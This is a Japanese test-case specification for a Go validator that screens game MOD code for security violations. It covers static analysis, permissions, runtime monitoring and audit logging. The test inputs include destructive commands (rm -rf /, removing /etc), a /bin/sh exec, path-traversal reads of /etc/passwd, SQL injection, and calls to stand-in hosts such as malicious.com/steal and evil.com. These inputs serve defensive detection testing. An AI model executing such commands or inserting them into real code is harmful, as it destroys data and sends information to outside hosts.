# TASK-302: ModSecurityValidator TDDテストケース

## テストケース一覧

### 1. 静的解析テストケース

#### TC-SA-001: 危険なコマンド実行パターンの検出
```go
// テスト入力
code := `
    exec.Command("rm", "-rf", "/")
    os.RemoveAll("/etc")
    syscall.Exec("/bin/sh", []string{}, nil)
`
// 期待結果
- 3つのセキュリティ違反を検出
- 各違反のSeverityはCritical
- ViolationTypeはCommandInjection
```

#### TC-SA-002: パストラバーサル攻撃の検出
```go
// テスト入力
code := `
    file := "../../../etc/passwd"
    ioutil.ReadFile(file)
    os.Open("../../sensitive.dat")
`
// 期待結果
- 2つのセキュリティ違反を検出
- ViolationTypeはPathTraversal
- 修正提案を含む
```

#### TC-SA-003: 不正なネットワークアクセスの検出
```go
// テスト入力
code := `
    http.Get("http://malicious.com/steal")
    net.Dial("tcp", "evil.com:666")
    conn, _ := net.Listen("tcp", ":8080")
`
// 期待結果
- 3つのセキュリティ違反を検出
- ViolationTypeはUnauthorizedNetworkAccess
- 外部通信とリスナー開設を識別
```

#### TC-SA-004: 安全なコードの検証
```go
// テスト入力: 安全なMODコード
code := `
    entity := api.CreateEntity()
    component := NewHealthComponent(100)
    api.AddComponent(entity, component)
`
// 期待結果
- セキュリティ違反なし
- Safe = true
- RiskScore = 0
```

#### TC-SA-005: 危険なインポートの検出
```go
// テスト入力
imports := []string{
    "os/exec",
    "syscall", 
    "unsafe",
    "plugin",
    "net/http",
}
// 期待結果
- 5つの危険なインポートを検出
- 各インポートに対する理由説明
- 代替案の提案
```

### 2. 権限管理テストケース

#### TC-PM-001: 基本的な権限チェック
```go
// セットアップ
policy := PermissionPolicy{
    Level: SecurityLevelRestricted,
    AllowedResources: []Resource{ResourceEntity, ResourceComponent},
    DeniedActions: []Action{ActionDelete, ActionSystemCall},
}
// テスト
CheckPermission("mod1", ResourceEntity, ActionCreate) // true
CheckPermission("mod1", ResourceEntity, ActionDelete) // false
CheckPermission("mod1", ResourceFile, ActionRead)    // false
```

#### TC-PM-002: 権限昇格リクエスト
```go
// テスト: 一時的な権限昇格
token, err := RequestPermissionElevation("mod1", PermissionFileRead)
// 期待結果
- tokenが有効（有効期限付き）
- 昇格後はファイル読み取り可能
- 期限切れ後は権限喪失
```

#### TC-PM-003: 階層的ポリシー継承
```go
// セットアップ: 親子ポリシー
globalPolicy := DefaultRestrictivePolicy()
modPolicy := InheritPolicy(globalPolicy).
    Allow(ResourceComponent, ActionModify)
// テスト
- グローバルポリシーの制限を継承
- MOD固有の追加権限を適用
- 競合時は最も制限的なポリシーを適用
```

#### TC-PM-004: レート制限の適用
```go
// セットアップ
policy.RateLimits = map[Action]RateLimit{
    ActionCreate: {Count: 10, Window: time.Second},
}
// テスト: 1秒間に11回のCreate試行
- 最初の10回は成功
- 11回目はレート制限エラー
- 1秒後にリセット
```

### 3. 実行時検証テストケース

#### TC-RV-001: リソース使用量監視
```go
// テスト: メモリ使用量の追跡
usage := MonitorResourceUsage("mod1")
// 期待結果
- Memory: 現在のメモリ使用量
- CPU: CPU使用率
- Goroutines: ゴルーチン数
- 閾値超過時のアラート
```

#### TC-RV-002: 異常動作の検出
```go
// テスト入力: 異常な動作パターン
events := []BehaviorEvent{
    {Type: EventEntityCreate, Count: 1000, Duration: time.Second},
    {Type: EventFileAccess, Target: "/etc/passwd"},
    {Type: EventNetworkConnect, Target: "unknown.host"},
}
// 期待結果
- 3つの異常を検出
- 各異常の深刻度評価
- 推奨アクション（隔離、停止など）
```

#### TC-RV-003: サンドボックス違反の検出
```go
// テスト: サンドボックス外へのアクセス試行
operation := Operation{
    Type: OpFileWrite,
    Target: "/../../system/config",
}
err := ValidateRuntimeOperation(operation)
// 期待結果
- エラー: SandboxViolation
- 操作はブロック
- セキュリティイベントログに記録
```

#### TC-RV-004: 実行時間制限の強制
```go
// テスト: 長時間実行の検出と停止
// MODが5秒以上実行
- 実行時間監視が作動
- タイムアウト警告
- 強制終了メカニズムの発動
```

### 4. 監査とログテストケース

#### TC-AL-001: セキュリティイベントログ
```go
// テスト: イベントログの記録
event := SecurityEvent{
    Type: EventViolation,
    ModID: "mod1",
    Details: "Attempted path traversal",
    Timestamp: time.Now(),
}
LogSecurityEvent(event)
// 期待結果
- イベントが永続化
- タイムスタンプ付き
- 検索可能な形式
```

#### TC-AL-002: セキュリティレポート生成
```go
// テスト: 24時間のセキュリティレポート
report := GenerateSecurityReport("mod1", 24*time.Hour)
// 期待結果
- 違反件数の集計
- リスクスコアの推移
- 推奨事項
- グラフ化可能なデータ
```

#### TC-AL-003: 監査証跡の検索
```go
// テスト: フィルタリングされた監査ログ
filter := AuditFilter{
    ModID: "mod1",
    StartTime: time.Now().Add(-1*time.Hour),
    EventTypes: []EventType{EventViolation, EventPermissionDenied},
}
entries := GetAuditTrail(filter)
// 期待結果
- フィルタ条件に一致するエントリ
- 時系列順にソート
- 詳細情報を含む
```

### 5. パフォーマンステストケース

#### TC-PF-001: 静的解析速度
```go
// テスト: 1000行のコード解析
code := GenerateLargeCode(1000) // 1000行のコード生成
start := time.Now()
result, _ := AnalyzeCode(code)
duration := time.Since(start)
// 期待結果
- duration < 100ms
- 完全な解析結果
- メモリ使用量 < 10MB
```

#### TC-PF-002: 並行解析のスケーラビリティ
```go
// テスト: 10個のMODを同時解析
var wg sync.WaitGroup
for i := 0; i < 10; i++ {
    wg.Add(1)
    go func(id int) {
        defer wg.Done()
        AnalyzeCode(modCodes[id])
    }(i)
}
wg.Wait()
// 期待結果
- 全MODの解析完了
- リニアなスケーリング
- デッドロックなし
```

#### TC-PF-003: 実行時オーバーヘッド測定
```go
// ベースライン測定
baselineTime := MeasureWithoutSecurity()
// セキュリティ有効時の測定
securityTime := MeasureWithSecurity()
// 期待結果
overhead := (securityTime - baselineTime) / baselineTime
- overhead < 0.05 (5%未満)
```

### 6. エッジケーステスト

#### TC-EC-001: 空のコード処理
```go
// テスト: 空文字列の処理
result, err := AnalyzeCode("")
// 期待結果
- エラーなし
- result.Safe = true
- 空の違反リスト
```

#### TC-EC-002: 巨大ファイルの処理
```go
// テスト: 100,000行のコード
hugeCode := GenerateCode(100000)
result, err := AnalyzeCode(hugeCode)
// 期待結果
- タイムアウトなし
- メモリエラーなし
- 段階的処理の実装
```

#### TC-EC-003: 同時多重アクセス
```go
// テスト: 同一MODへの並行アクセス
// 100個のゴルーチンから同時アクセス
- データ競合なし
- 一貫性のある結果
- パニックなし
```

#### TC-EC-004: 循環参照の検出
```go
// テスト: ポリシーの循環参照
policyA.Inherits(policyB)
policyB.Inherits(policyA)
// 期待結果
- 循環参照エラー
- スタックオーバーフローなし
```

### 7. セキュリティ攻撃シミュレーション

#### TC-SA-001: SQLインジェクション検出
```go
// テスト入力
code := `
    query := "SELECT * FROM users WHERE id = " + userInput
    db.Query(query)
`
// 期待結果
- SQLインジェクションリスク検出
- パラメータ化クエリの提案
```

#### TC-SA-002: タイミング攻撃の防御
```go
// テスト: 一定時間での応答
// 権限チェックの時間測定
- 成功時と失敗時の応答時間差 < 1ms
- タイミングベースの情報漏洩防止
```

#### TC-SA-003: リソース枯渇攻撃
```go
// テスト: 大量リソース要求
// 1000個のエンティティ作成試行
- リソース制限の適用
- システム全体への影響なし
- グレースフルな拒否
```

## テスト実行計画

### Phase 1: 基本機能テスト
1. 静的解析の基本テスト（TC-SA-001〜004）
2. 基本的な権限管理（TC-PM-001）
3. シンプルなログ記録（TC-AL-001）

### Phase 2: 高度な機能テスト
1. 複雑な静的解析（TC-SA-005）
2. 権限昇格と継承（TC-PM-002〜003）
3. 実行時検証（TC-RV-001〜003）

### Phase 3: 非機能要件テスト
1. パフォーマンステスト（TC-PF-001〜003）
2. エッジケース（TC-EC-001〜004）
3. セキュリティ攻撃（TC-SA-001〜003）

## カバレッジ目標

- **コードカバレッジ**: 90%以上
- **ブランチカバレッジ**: 85%以上
- **攻撃パターンカバレッジ**: 既知パターンの100%

## テスト環境要件

- Go 1.22以上
- テスト用サンドボックス環境
- モックMODコードサンプル
- セキュリティパターンデータベース

## 成功基準

1. すべてのテストケースが期待通りに動作
2. パフォーマンス目標を達成
3. セキュリティ脆弱性ゼロ
4. 偽陽性率5%未満